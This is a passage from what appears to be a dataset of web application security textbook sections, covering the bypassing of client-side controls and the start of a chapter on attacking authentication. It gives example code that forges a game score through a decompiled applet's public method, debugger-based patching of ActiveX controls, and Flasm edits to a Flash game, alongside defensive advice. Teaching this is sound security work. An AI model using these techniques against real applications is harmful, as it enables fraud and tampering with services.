i++)\noutput.append((char)((input.charAt(i) - 3) + i * 4));\nreturn output.toString();\n}\nprivate static String checksum(String input)\n{\nchar checksum = ‘\\0’;\nfor(int i = 0; i < input.length(); i++)\n{\nchecksum ^= input.charAt(i);\nchecksum <<= ‘\\002’;\n}\nreturn new String(new char[] {\n(char)(checksum / 256), (char)(checksum % 256)\n});\n}\n...\nNOTE For various reasons, Jad sometimes does not do a perfect job of\ndecompiling bytecode, and you may need to tidy up some of its output before it\ncan be recompiled.\nWith access to this source code, you can immediately see how your score is\nconverted into a long obfuscated string that has the characteristics observed.\nThe applet first appends some random data to your score (separated by the\npipe character). It takes a checksum of the resulting string, and also scrambles\nit. It then prepends the checksum to the scrambled string and finally hex-\nencodes the result for safe transmission within a URL parameter.\nThe addition of some random data accounts for the length and unpre-\ndictability of the obfuscated string, and the addition of a checksum explains\nwhy changing any part of the obfuscated string causes the server-side decoder\nto reject it.\nHaving decompiled the applet back to its source code, there are various\nways in which you could leverage this to bypass the client-side controls and\nsubmit an arbitrary high score to the server:\n■■ You can modify the decompiled source to change the behavior of the\napplet, recompile it to bytecode, and modify the source code of the\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 116\n116 Chapter 5 ■ Bypassing Client-Side Controls\nHTML page to load the modified applet in place of the original. For\nexample, you could change the getObsScoremethod to:\nreturn obfuscate(“99999|0.123456789”);\nTo recompile your modified code, you should use the Java compiler\njavacprovided with Sun’s Java SDK.\n■■ You can add a main method to the decompiled source to provide the\nfunctionality to obfuscate arbitrary inputs:\npublic static void main(String[] args)\n{\nSystem.out.println(obfuscate(args[0]));\n}\nYou can then run the recompiled byte code from the command line to\nobfuscate any score you like:\nE:\\>java JavaGame “99999|0.123456789“\n6ca4363a3e42468d45474e53585d62676c7176\n■■ You can review the public methods exposed by the applet to determine\nwhether any of them can be leveraged to achieve your objectives with-\nout actually modifying the applet. In the present case, you can see that\nthe obfuscatemethod is marked as public, meaning that you can call it\ndirectly from JavaScript with arbitrary input. Hence, you can submit\nyour chosen score simply by modifying the source code of the HTML\npage as follows:\nfunction play()\n{\nalert(“you scored “ + TheApplet.getScore());\ndocument.location = “submitScore.jsp?score=” +\nTheApplet.obfuscate(“99999|0.123456789”) + “&name=” +\ndocument.playForm.yourName.value;\n}\nTIP Often, Java applets are packed up as JAR (Java ARchive) files, which\ncontain multiple class files and other resources such as sounds and images.\nJAR files are really just ZIP archives with the .jarfile extension. You can\nunpack and repack them using standard archive readers like WinRar or WinZip,\nand also using the Jar tool, which is included in Sun’s Java SDK.\nTIP Other useful tools for analyzing and manipulating Java applets are Jode\n(a decompiler and bytecode obfuscator) and JSwat (a Java debugger).\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 117\nChapter 5 ■ Bypassing Client-Side Controls 117\nHACK STEPS\n■ Review all calls made to an applet’s methods, and determine whether\ndata returned from the applet is being submitted to the server.\n■ If that data is transparent in nature (i.e., is not obfuscated or encrypted),\nprobe and attack the server’s processing of the submitted data in the\nsame way as for any other parameter.\n■ If the data is opaque, decompile the applet to obtain its source code.\n■ Review the relevant source code (starting with the implementation of the\nmethod that returns the opaque data) to understand what processing is\nbeing performed.\n■ Determine whether the applet contains any public methods that can be\nused to perform the relevant obfuscation on arbitrary input.\n■ If not, modify and recompile the applet’s source in such a way as to neu-\ntralize any validation it performs or allow you to obfuscate arbitrary\ninput.\n■ Then, submit various suitably obfuscated attack strings to the server to\nprobe for vulnerabilities, as you would for any other parameter.\nCoping with Bytecode Obfuscation\nBecause of the ease with which Java bytecode can be decompiled to recover its\nsource, various techniques have been developed to obfuscate the bytecode\nitself. Applying these techniques results in bytecode that is harder to decom-\npile or that decompiles to misleading or invalid source code that may be very\ndifficult to understand and impossible to recompile without substantial effort.\nFor example:\npackage myapp.interface;\nimport myapp.class.public;\nimport myapp.interface.else.class;\nimport myapp.throw.throw;\nimport if.if.if.if.else;\nimport if.if.if.if.if;\nimport java.awt.event.KeyEvent;\npublic class double extends public implements strict\n{\npublic double(j j1)\n{\n_mthif();\n_fldif = j1;\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 118\n118 Chapter 5 ■ Bypassing Client-Side Controls\n}\nprivate void _mthif(ActionEvent actionevent)\n{\n_mthif(((KeyEvent) (null)));\nswitch(_fldif._mthnew()._fldif)\n{\ncase 0:\n_fldfloat.setEnabled(false);\n_fldboolean.setEnabled(false);\n_fldinstanceof.setEnabled(false);\n_fldint.setEnabled(false);\nbreak;\ncase 3:\n_fldfloat.setEnabled(true);\n_fldboolean.setEnabled(true);\n_fldinstanceof.setEnabled(false);\n_fldint.setEnabled(false);\nbreak;\n...\nThe obfuscation techniques commonly employed are as follows:\n■■ Meaningful class, method, and member variable names are replaced\nwith meaningless expressions like a, b, c. This forces the reader of\ndecompiled code to identify the purpose of each item by studying how\nit is used, and can make it very difficult to keep track of different items\nwhile tracing them through the source code.\n■■ Going further, some obfuscators replace item names with Java key-\nwords such as newand int. Although this technically renders the byte-\ncode illegal, most JVMs will tolerate the illegal code and it will execute\nnormally. However, even if a decompiler can handle the illegal byte-\ncode, the resulting source code will be even less readable than that\ndescribed in the previous point. More importantly, the source will not\nbe recompilable without extensive reworking to rename illegally named\nitems in a consistent manner.\n■■ Many obfuscators strip unnecessary debug and meta-information from\nthe bytecode, including source file names and line numbers (which\nmakes stack traces less informative), local variable names (which frus-\ntrates debugging), and inner class information (which stops reflection\nfrom working properly).\n■■ Redundant code may be added that creates and manipulates various\nkinds of data in significant-looking ways but that is autonomous from\nthe real data actually being used by the application’s functionality.\n■■ The path of execution through code can be modified in convoluted\nways, through the use of jump instructions, so that the logical sequence\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 119\nChapter 5 ■ Bypassing Client-Side Controls 119\nof execution is hard to discern when reading through the decompiled\nsource.\n■■ Illegal programming constructs may be introduced, such as unreach-\nable statements, and code paths with missing return statements. Most\nJVMs will tolerate these phenomena in bytecode, but the decompiled\nsource cannot be recompiled without correcting the illegal code.\nHACK STEPS\nEffective tactics for coping with bytecode obfuscation depend upon the\ntechniques used and the purpose for which you are analyzing the source. Here\nare some suggestions:\n■ You can review an applet for public methods without fully understanding\nthe source. It should be obvious which methods can be invoked from\nJavaScript, and what their signatures are, enabling you to test the behav-\nior of the methods by passing in various inputs.\n■ If class, method, and member variable names have been replaced with\nmeaningless expressions (but not Java keywords), then you can use the\nrefactoring functionality built into many IDEs to assist you in understand-\ning the code. By studying how items are used, you can start to assign\nthem meaningful names. If you use the “rename” tool within the IDE, it\nwill do a lot of work for you, tracing the use of the item throughout the\ncodebase and renaming it everywhere.\n■ You can actually undo a lot of obfuscation by running the obfuscated\nbytecode through an obfuscator a second time and choosing suitable\noptions. A useful obfuscator to use here is Jode, which can remove\nredundant code paths added by another obfuscator, and facilitate the\nprocess of understanding obfuscated names by assigning globally unique\nnames to items.\nActiveX Controls\nActiveX controls are a much more heavyweight technology than Java applets.\nThey are effectively native Win32 executables that, once accepted and installed\nby the user, execute with the full privileges of that user and can carry out arbi-\ntrary actions, including interacting with the operating system.\nActiveX can be used to implement practically any client-side control,\nincluding capturing user input and other in-browser data, and verifying that\nthe client computer meets certain security standards before allowing access to\nsome function.\nFrom the point of view of HTML page source, ActiveX controls are instanti-\nated and invoked in a very similar way to Java applets. For example, if you\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 120\n120 Chapter 5 ■ Bypassing Client-Side Controls\nhave installed the Adobe Acrobat plug-in for Internet Explorer, the following\ncode will display a dialog showing the version of Acrobat installed:\n<object id=”TheAxControl”\nclassid=”CLSID:4F878398-E58A-11D3-BEE9-00C04FA0D6BA”>\n</object>\n<form>\n<input type=”button” value=”Show version”\nonclick=JavaScript:alert(document.TheAxControl.AcrobatVersion)>\n</form>\nIn addition to looking for code like this, you can easily identify instances\nwhere an application attempts to install a new ActiveX control, because your\nbrowser will present an alert asking for your permission to install it.\nNOTE Poorly written ActiveX controls have been a major source of security\nvulnerabilities in recent years, and unwitting users who install defective\ncontrols often leave themselves open to full system compromise at the hands\nof any malicious web site that invokes and exploits the control. In Chapter 12,\nwe describe how you can find and exploit common vulnerabilities in ActiveX\ncontrols to attack other users of an application.\nThere are various techniques that can be used to circumvent client-side con-\ntrols implemented using ActiveX.\nReverse Engineering\nBecause ActiveX controls are typically written in native languages like C and\nC++, they cannot be trivially decompiled back to source code in the way that\nJava applets can be. Nevertheless, because all of the processing performed by\nan ActiveX control occurs on the client computer, it is in principle possible for\na user on that computer to fully scrutinize and control that processing, thereby\ncircumventing any security functions that it implements.\nReverse engineering is a complex and advanced topic, which extends\nbeyond the scope of this book. However, there are some basic techniques that\neven a relatively inexperienced reverse engineer can use to defeat the client-\nside security mechanisms implemented within many ActiveX controls.\nHACK STEPS\n■ Rather than pursuing a full static disassembly of the component’s code, use\nan intuitive GUI-based debugger to monitor and control its execution at run-\ntime. For example, OllyDbg is an accessible yet powerful debugger that can\nbe used to achieve many kinds of attacks on compiled software at runtime:\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 121\nChapter 5 ■ Bypassing Client-Side Controls 121\nHACK STEPS (continued)\n■ Identify the methods exported by the control and its subcomponents,\nand also any interesting operating system functions which the control\nimports—in particular, any cryptographic functions. Set breakpoints on\nthese functions within the debugger.\n■ When a breakpoint is hit, review the call stack to identify any relevant\ndata being passed to the function—in particular, any user-supplied data\nthat is being subjected to validation. By tracing the path of this data,\nattempt to understand the processing being performed on it.\n■ It is often easy to use a debugger to subvert the execution path of a\nprocess in useful ways—for example, by modifying the parameters on\nthe stack being passed as inputs to a function, modifying the EAX regis-\nter used to pass the return value back from a function, or rewriting key\ninstructions like comparisons and jumps to change the logic imple-\nmented within a function. If possible, use these techniques to circumvent\nvalidation controls, causing potentially malicious data to be accepted for\nfurther processing.\n■ If data validation is performed before further manipulation such as\nencryption or obfuscation, you can exploit this separation by supplying\nvalid data to the control, and then intercept and modify the data after it\nhas passed the validation steps, so that your potentially malicious data is\nappropriately manipulated before being transmitted to the server-side\napplication.\n■ If you find a means of manually altering the control’s processing to\ndefeat the validation it is performing, you can automate the execution of\nthis attack either by modifying the control’s binary on-disk (OllyDbg has\na facility to update binaries to reflect changes you have made to its code\nwithin the debugger) or by hooking into the target process at runtime,\nusing an instrumentation framework such as Microsoft Detours.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 122\n122 Chapter 5 ■ Bypassing Client-Side Controls\nThe following are some useful resources if you’d like to find out more about\nreverse engineering and related topics:\n■■ Reversing: Secrets of Reverse Engineeringby Eldad Eilam\n■■ Hacker Disassembling Uncoveredby Kris Kaspersky\n■■ The Art of Software Security Assessmentby Mark Dowd, John McDonald,\nand Justin Schuh\n■■ www.acm.uiuc.edu/sigmil/RevEng\n■■ www.uninformed.org/?v=1&a=7\nManipulating Exported Functions\nAs with Java applets, it may be possible to manipulate and repurpose an\nActiveX control’s processing solely by invoking methods that it exposes to the\nbrowser through its normal interface.\nActiveX controls may expose numerous methods that the application never\nactually invokes from HTML, which you may not be aware of without exam-\nining the control itself. COMRaider by iDefense is a useful tool that can dis-\nplay all of a control’s methods and their signatures, as shown in Figure5-7.\nFigure 5-7: COMRaider showing the methods exposed by an ActiveX control\nHACK STEPS\n■ Developers typically use meaningful names for ActiveX methods, and it\nmay be possible to identify useful methods simply from their names.\n■ You can sometimes determine the purpose of a function by systemati-\ncally invoking it with different inputs and monitoring both the visible\nbehavior of the control and its internal workings using your debugger.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 123\nChapter 5 ■ Bypassing Client-Side Controls 123\nFixing Inputs Processed by Controls\nA common use to which ActiveX controls are put is as a client-side control to\nverify that the client computer complies with specific security standards before\naccess is granted to certain server-side functionality. For example, in an attempt\nto mitigate against keylogging attacks, an online banking application may\ninstall a control that checks for the presence of a virus scanner, and the operat-\ning system patch level, before permitting a user to log in to the application.\nIf you need to circumvent this type of client-side control, it is usually easy to\ndo. The ActiveX control will typically read various details from the local com-\nputer’s file system and registry as input data for its checks. You can monitor\nthe information being read and feed arbitrary inputs into the control that com-\nply with its security checks.\nThe Filemon and Regmon tools originally developed by Sysinternals (and\nnow owned by Microsoft) enable you to monitor all of a process’s interaction\nwith the computer’s file system and registry. You can filter the tools’ output to\ndisplay only the activity of the process you are interested in. When an ActiveX\ncontrol is performing security checks on the client computer, you will typically\nsee it querying security-relevant files and registry keys, such as items created\nby antivirus products, as shown in Figure5-8.\nFigure 5-8: Regmon being used to capture the registry access carried\nout by an ActiveX control\nIn this situation, it is usually sufficient to manually create the relevant file or\nregistry key, to convince the control that the corresponding software is installed.\nIf for some reason you do not wish to interfere with the actual operating system,\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 124\n124 Chapter 5 ■ Bypassing Client-Side Controls\nyou can achieve the same effect using the debugging or instrumentation tech-\nniques described previously, to fix the data returned to the control by the rele-\nvant file system or registry APIs.\nDecompiling Managed Code\nOccasionally, you may encounter thick-client components written in C#. As\nwith Java applets, these can normally be decompiled to recover the original\nsource code.\nA useful tool for performing this task is .NET Reflector by Lutz Roeder (see\nFigure5-9).\nFigure 5-9: The .NET Reflector tool being used to decompile an\nActiveX control written in C#\nSimilar code obfuscation issues can arise in relation to C# assemblies as arise\nwith Java bytecode.\nShockwave Flash Objects\nFlash is very popular on the Internet. It is often used as a means of providing\nincreased interactivity in informational web sites, but it is also employed in\nweb applications. Some online stores have Flash-based user interfaces, and it\nis often used in jukebox software such as Pandora radio. The most common\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 125\nChapter 5 ■ Bypassing Client-Side Controls 125\nuse of Flash in an application context is in online games. These vary in nature\nfrom purely recreational games to serious casino functionality, where real\nmoney is involved. Many such games have been targeted by correspondingly\nrecreational and serious attackers.\nGiven what we have observed about the fallible nature of client-side con-\ntrols, the idea of implementing an online gambling application using a thick-\nclient component that runs locally on a potential attacker’s machine is an\nintriguing one. If any aspect of the game play is controlled within the Flash\ncomponent instead of by the server, an attacker could manipulate the game\nwith fine precision to improve odds, change the rules, or alter the scores sub-\nmitted back to the server.\nLike the other thick-client components examined, Flash objects are con-\ntained within a compiled file that the browser downloads from the server and\nexecutes in a virtual machine, which in this case is a Flash player implemented\nin a browser plug-in. The SWF file contains bytecode that is interpreted by the\nFlash VM (virtual machine), and as with Java bytecode, this can be decompiled\nto recover the original ActionScript source code, using appropriate tools. An\nalternative means of attack, which is often more effective, is to disassemble\nand modify the bytecode itself, without actually fully decompiling it to source.\nFlasm is a disassembler and assembler for SWF bytecode and can be used to\nextract a human-readable representation of the bytecode from an SWF file and\nthen reassemble modified bytecode into a new SWF file:\nC:\\flash>flasm\nFlasm 1.61 build May 31 2006\n(c) 2001 Opaque Industries, (c) 2002-2005 Igor Kogan, (c) 2005 Wang Zhen\nAll rights reserved. See LICENSE.TXT for terms of use.\nUsage: flasm [command] filename\nCommands:\n-d Disassemble SWF file to the console\n-a Assemble Flasm project (FLM)\n-u Update SWF file, replace Flasm macros\n-b Assemble actions to __bytecode__ instruction or byte sequence\n-z Compress SWF with zLib\n-x Decompress SWF\nBackups with $wf extension are created for altered SWF files.\nTo save disassembly or __bytecode__ to file, redirect it:\nflasm -d foo.swf > foo.flm\nflasm -b foo.txt > foo.as\nRead flasm.html for more information.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 126\n126 Chapter 5 ■ Bypassing Client-Side Controls\nThe following example shows Flasm being used to extract a human-\nr eadable representation of bytecode from an SWF file for a simple Flash-based\ncar racing game:\nC:\\flash>flasm racer.swf > racer.flm\nC:\\flash>more racer.flm\nmovie ‘racer.swf’ compressed // flash 7, total frames: 3, frame rate: 24\nfps, 64\n0x500 px\nexportAssets\n1 as ‘engineStart’\nend // of exportAssets\nexportAssets\n2 as ‘engineLoop’\nend // of exportAssets\nframe 0\nstop\npush ‘car1’\ngetVariable\npush ‘code’, ‘player’\nsetMember\npush ‘totalLaps’, 10\nsetVariable\npush ‘acceleration’, 1.9\nsetVariable\npush ‘gravity’, 0.4\nsetVariable\npush ‘speedDecay’, 0.96\nsetVariable\npush ‘rotationStep’, 10\nsetVariable\npush ‘maxSpeed’, 10\nsetVariable\npush ‘backSpeed’, 1\nsetVariable\npush ‘currentCheckpoint1’, 1\nsetVariable\npush ‘currentLap1’, 0.0\nsetVariable\npush ‘checkpoints’, 2\nsetVariable\npush ‘currentLapTXT’, ‘1/10’\nsetVariable\nend // of frame 0\nframe 0\nconstants ‘car’, ‘code’, ‘player’, ‘speed’, ‘speedDecay’, ‘Key’,\n‘isDown’, ‘\n...\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 127\nChapter 5 ■ Bypassing Client-Side Controls 127\nHere, you can immediately see various bytecode instructions that are of\ninterest to someone wishing to attack and modify the game. For example, you\ncould change the value of the maxSpeed variable from 10 to something a bit\nmore competitive. After doing this, the modified disassembly can then be con-\nverted back into bytecode in a new SWF file, as follows:\nC:\\flash>flasm –a racer.flm\nracer.flm successfully assembled to racer.swf, 31212 bytes\nThe car should now virtually fly around the track (to make it literally fly,\nyou could try changing the gravityvariable!).\nIn the previous example, the functionality implemented within the Flash\nobject was sufficiently simple that an attacker could fundamentally reengineer\nthe object by inspecting the disassembled bytecode and changing a single vari-\nable. In more complex Flash objects, this may not be possible, and it may be\nnecessary to recover the original source and review it in detail to discover how\nthe object works and where best to attack it. The Flare tool can be used to\ndecompile an SWF file back into the original ActionScript source:\nC:\\flash>flare racer.swf && more racer.flr\nmovie ‘racer.swf’ {\n// flash 7, total frames: 3, frame rate: 24 fps, 640x500 px, compressed\nframe 1 {\nstop();\ncar1.code = ‘player’;\ntotalLaps = 10;\nacceleration = 1.9;\ngravity = 0.4\nspeedDecay = 0.96;\nrotationStep = 10;\nmaxSpeed = 10;\nbackSpeed = 1;\ncurrentCheckpoint1 = 1;\ncurrentLap1 = 0;\ncheckpoints = 2;\ncurrentLapTXT = ‘1/10’;\n}\n...\nWhile modifying recreational games is usually straightforward and may be\nfun for personal amusement and beating a coworker, the client-side controls\nimplemented within the Flash objects used by enterprise applications and\nonline casinos are typically better protected. As with Java, obfuscation tech-\nniques have been devised in an attempt to hinder decompilation attacks. Two\navailable tools are ActionScript Obfuscator and Viewer Screwer, which can\nchange both meaningful variable names and text references into scrambled\nsequences of letters, making the decompiled code harder to understand."
  },
  {
    "input": "Handling Client-Side Data Securely",
    "output": "70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 128\n128 Chapter 5 ■ Bypassing Client-Side Controls\nThe tools described can be obtained from:\n■■ Flasm—www.nowrap.de/flasm\n■■ Flare—www.nowrap.de/flare\n■■ ActionScript Obfuscator—www.genable.com/aso.html\n■■ Viewer Screwer—www.debreuil.com/vs\nHACK STEPS\n■ Explore the functionality of the Flash object within your browser. Use an\nintercepting proxy to monitor any requests made to the server, to under-\nstand which actions are executed entirely within the client-side compo-\nnent itself and which may involve some server-side processing and\ncontrols.\n■ Any time you see data being submitted to the server, determine whether\nthis is transparent in nature, or has been obfuscated or encrypted in\nsome way. If the former is the case, you can bypass any controls imple-\nmented within the object by simply modifying this data directly.\n■ If the data that the object submits is opaque in nature, use Flasm to dis-\nassemble the object into human-readable bytecode, and use Flare to\ndecompile the object into ActionScript source.\n■ As with decompiled Java applets, review the bytecode and source to\nidentify any attack points that will enable you to reengineer the Flash\nobject and bypass any controls implemented within it.\nHandling Client-Side Data Securely\nAs you have seen, the core security problem with web applications arises\nbecause client-side components and user input are outside of the server’s\ndirect control. The client, and all of the data received from it, is inherently\nuntrustworthy.\nTransmitting Data via the Client\nMany applications leave themselves exposed because they transmit critical\ndata such as product prices and discount rates via the client in an unsafe\nmanner.\nIf possible, applications should avoid transmitting this kind of data via the\nclient altogether. In virtually any conceivable scenario, it is possible to hold\nsuch data on the server, and reference it directly from server-side logic when\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 129\nChapter 5 ■ Bypassing Client-Side Controls 129\nneeded. For example, an application that receives users’ orders for various dif-\nferent products should allow users to submit a product code and quantity, and\nlook up the price of each requested product in a server-side database. There is\nno need for users to submit the prices of items back to the server. Even where\nan application offers different prices or discounts to different users, there is no\nneed to depart from this model. Prices can be held within the database on a\nper-user basis, and discount rates can be stored in user profiles or even session\nobjects. The application already possesses, server-side, all of the information it\nneeds to calculate the price of a specific product for a specific user—it must,\notherwise it would not be able, on the insecure model, to store this price in a\nhidden form field.\nIf developers decide they have no alternative but to transmit critical data via\nthe client, then the data should be signed and/or encrypted to prevent tam-\npering by the user. If this course of action is taken, then there are two impor-\ntant pitfalls to avoid:\n■■ Some ways of using signed or encrypted data may be vulnerable\nto replay attacks. For example, if the product price is encrypted\nbefore being stored in a hidden field, it may be possible to copy the\nencrypted price of a cheaper product, and submit this in place of the\noriginal price. To prevent this attack, the application needs to include\nsufficient context within the encrypted data to prevent it from being\nreplayed in a different context. For example, the application could con-\ncatenate the product code and price, encrypt the result as a single item,\nand then validate that the encrypted string submitted with an order\nactually matches the product being ordered.\n■■ If users know and/or control the plaintext value of encrypted strings\nthat are sent to them, then they may be able to mount various crypto-\ngraphic attacks to discover the encryption key being used by the server.\nHaving done this, they can encrypt arbitrary values and fully circum-\nvent the protection offered by the solution.\nIn applications running on the ASP.NET platform, it is advisable to never\nstore any customized data within the ViewState, and certainly never anything\nsensitive that you would not want to be displayed on-screen to users. The\noption to enable the ViewState MAC should always be activated.\nValidating Client-Generated Data\nData generated on the client and transmitted to the server cannot in principle\nbe validated securely on the client:\n■■ Lightweight client-side controls like HTML form fields and JavaScript\ncan be very trivially circumvented, and provide zero assurance about\nthe input received by the server.\n70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 130\n130 Chapter 5 ■ Bypassing Client-Side Controls\n■■ Controls implemented in thick-client components are sometimes more\ndifficult to circumvent, but this may merely slow down an attacker for a\nshort period.\n■■ Using heavily obfuscated or packed client-side code provides addi-\ntional obstacles; however, a determined attacker will always be able to\novercome these. (A point of comparison in other areas is the use of\nDRM technologies to prevent users from copying digital media files.\nMany companies have invested very heavily in these client-side con-\ntrols, and each new solution is usually broken within a short interval.)\nThe only secure way to validate client-generated data is on the server side of\nthe application. Every item of data received from the client should be regarded\nas tainted and potentially malicious.\nCOMMON MYTH It is sometimes perceived that any use of client-\nside controls must be automatically bad. In particular, some professional\npenetration testers report the presence of client-side controls as a “finding”\nwithout verifying whether they are replicated on the server or whether there is\nany nonsecurity explanation for their existence. In fact, despite the significant\ncaveats arising from the various attacks described in this chapter, there are\nnevertheless ways of using client-side controls in ways that do not give rise to\nany security vulnerabilities:\n■■ Client-side scripts can be used to validate input as a means of\nenhancing usability, avoiding the need for round-trip communication\nwith the server. For example, if the user enters their date of birth in an\nincorrect format, alerting them to the problem via a client-side script\nprovides a much more seamless experience. Of course, the application\nmust revalidate the item submitted when it arrives at the server.\n■■ There are occasional cases where client-side data validation can be\neffective as a security measure—for example, as a defense against\nDOM-based cross-site scripting attacks. However, these are cases\nwhere the direct focus of the attack is another application user, rather\nthan the server-side application, and exploiting a potential\nvulnerability does not necessarily depend upon transmitting any\nmalicious data to the server. See Chapter 12 for further details of this\nkind of scenario.\n■■ As described previously, there are ways of transmitting encrypted data\nvia the client that are not vulnerable to tampering or replay attacks."
  },
  {
    "input": "Chapter Summary",
    "output": "70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 131\nChapter 5 ■ Bypassing Client-Side Controls 131\nLogging and Alerting\nWhen mechanisms such as length limits and JavaScript-based validation are\nemployed by an application to enhance performance and usability, these\nshould be integrated with server-side intrusion detection defenses. The server-\nside logic which performs validation of client-submitted data should be aware\nof the validation that has already occurred on the client side. If data that would\nhave been blocked by client-side validation is received, the application may\ninfer that a user is actively circumventing this validation, and so is likely to be\nmalicious. Anomalies should be logged and, if appropriate, application\nadministrators should be alerted in real time so that they can monitor any\nattempted attack and take suitable action as required. The application may\nalso actively defend itself by terminating the user’s session or even suspend-\ning his account.\nNOTE In some cases where JavaScript is employed, the application is still\nusable by users who have disabled JavaScript within their browser. In this\nsituation, JavaScript-based form validation code is simply skipped by the\nbrowser, and the raw input entered by the user is submitted. To avoid false\npositives, the logging and alerting mechanism should be aware of where and\nhow this can arise.\nChapter Summary\nVirtually all client-server applications must accept the fact that the client com-\nponent, and all processing that occurs on it, cannot be trusted to behave as\nexpected. As you have seen, the transparent communications methods gener-\nally employed by web applications mean that an attacker equipped with sim-\nple tools and minimal skill can trivially circumvent most controls\nimplemented on the client. Even where an application makes attempts to\nobfuscate data and processing residing on the client side, a determined\nattacker will be able to compromise these defenses.\nIn every instance where you identify data being transmitted via the client, or\nvalidation of user-supplied input being implemented on the client, you should\ntest how the server responds to unexpected data that bypasses those controls.\nVery often, serious vulnerabilities are to be found lurking behind an applica-\ntion’s assumptions about the protection afforded to it by defenses that are\nimplemented at the client."
  },
  {
    "input": "Questions",
    "output": "70779c05.qxd:WileyRed 9/16/07 5:14 PM Page 132\n132 Chapter 5 ■ Bypassing Client-Side Controls\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. How can data be transmitted via the client in a way that prevents tam-\npering attacks?\n2. An application developer wishes to stop an attacker from performing\nbrute-force attacks against the login function. Because the attacker may\ntarget multiple usernames, the developer decides to store the number of\nfailed attempts in an encrypted cookie, blocking any request if the num-\nber of failed attempts exceeds five.\nHow can this defense be bypassed?\n3. An application contains an administrative page that is subject to rigor-\nous access controls. The page contains links to diagnostic functions\nlocated on a different web server. Access to these functions should also\nbe restricted to administrators only. Without implementing a second\nauthentication mechanism, which of the following client-side mecha-\nnisms (if any) could be used to safely control access to the diagnostic\nfunctionality? Is there any further information you would need to help\nchoose a solution?\n(a) The diagnostic functions could check the HTTP Refererheader, to\nconfirm that the request originated on the main administrative page.\n(b) The diagnostic functions could validate the supplied cookies, to con-\nfirm that these contain a valid session token for the main applica-\ntion.\n(c) The main application could set an authentication token in a hidden\nfield that is included within the request. The diagnostic function\ncould validate this to confirm that the user has a session on the main\napplication.\n4. If a form field includes the attribute disabled=true, it will not be sub-\nmitted with the rest of the form. How can you change this behavior?\n5. Are there any means by which an application can ensure that a piece of\ninput validation logic has been run on the client?"
  },
  {
    "input": "Chapter 6: Attacking Authentication",
    "output": "70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 133\nCHAPTER\n6\nAttacking Authentication\nOn the face of it, authentication is conceptually among the simplest of all the\nsecurity mechanisms employed within web applications. In the typical case, a\nuser supplies her username and password, and the application must verify\nthat these items are correct. If so, it lets the user in. If not, it does not.\nAuthentication also lies at the heart of an application’s protection against\nmalicious attack. It is the front line of defense against unauthorized access, and\nif an attacker can defeat those defenses, they will often gain full control of the\napplication’s functionality, and unrestricted access to the data held within it.\nWithout robust authentication to rely upon, none of the other core security\nmechanisms (such as session management and access control) can be effective.\nIn fact, despite its apparent simplicity, devising a secure authentication\nfunction is an extremely subtle business, and in real-world web applications\nauthentication is very often the weakest link, which enables an attacker to gain\nunauthorized access. The authors have lost count of the number of applica-\ntions that we have fundamentally compromised as a result of various defects\nin authentication logic.\nThis chapter will look in detail at the wide variety of design and implemen-\ntation flaws that commonly afflict web applications. These typically arise\nbecause the application designers and developers fail to ask a simple question:\nWhat could an attacker achieve if he were to target our authentication mecha-\nnism? In the majority of cases, as soon as this question is asked in earnest of a\n133"
  },
  {
    "input": "Authentication Technologies",
    "output": "70779c06.qxd:WileyRed 9/14/07 3:13 PM Page 134\n134 Chapter 6 ■ Attacking Authentication\nparticular application, a number of potential vulnerabilities materialize, any\none of which may be sufficient to break the application.\nMany of the most common authentication vulnerabilities are literally no-\nbrainers. Anyone can type dictionary words into a login form in an attempt to\nguess valid passwords. In other cases, subtle defects may lurk deep within the\napplication’s processing, which can only be uncovered and exploited after\npainstaking analysis of a complex multistage login mechanism. We will\ndescribe the full spectrum of these attacks, including techniques which have\nsucceeded in breaking the authentication of some of the most security-critical\nand robustly defended web applications on the planet.\nAuthentication Technologies\nThere is a wide range of different technologies available to web application\ndevelopers when implementing authentication mechanisms:\n■■ HTML forms-based authentication.\n■■ Multi-factor mechanisms, such as those combining passwords and\nphysical tokens.\n■■ Client SSL certificates and/or smartcards.\n■■ HTTP basic and digest authentication.\n■■ Windows-integrated authentication using NTLM or Kerberos.\n■■ Authentication services.\nBy far the most common authentication mechanism employed by web\napplications uses HTML forms to capture a username and password and sub-\nmit these to the application. This mechanism accounts for well over 90% of\napplications you are likely to encounter on the Internet.\nIn more security-critical Internet applications, such as online banking, this\nbasic mechanism is often expanded into multiple stages, requiring the user to\nsubmit additional credentials, such as PIN numbers or selected characters from\na secret word. HTML forms are still typically used to capture relevant data.\nIn the most security-critical applications, such as private banking for high-\nworth individuals, it is common to encounter multi-factor mechanisms using\nphysical tokens. These tokens typically produce a stream of one-time pass-\ncodes, or perform a challenge-response function based on input specified by\nthe application. As the cost of this technology falls over time, it is likely that\nmore applications will employ this kind of mechanism. However, many of\nthese solutions do not actually address the threats for which they were\ndevised—primarily phishing attacks and those employing client-side Trojans."
  },
  {
    "input": "Design Flaws in Authentication Mechanisms",
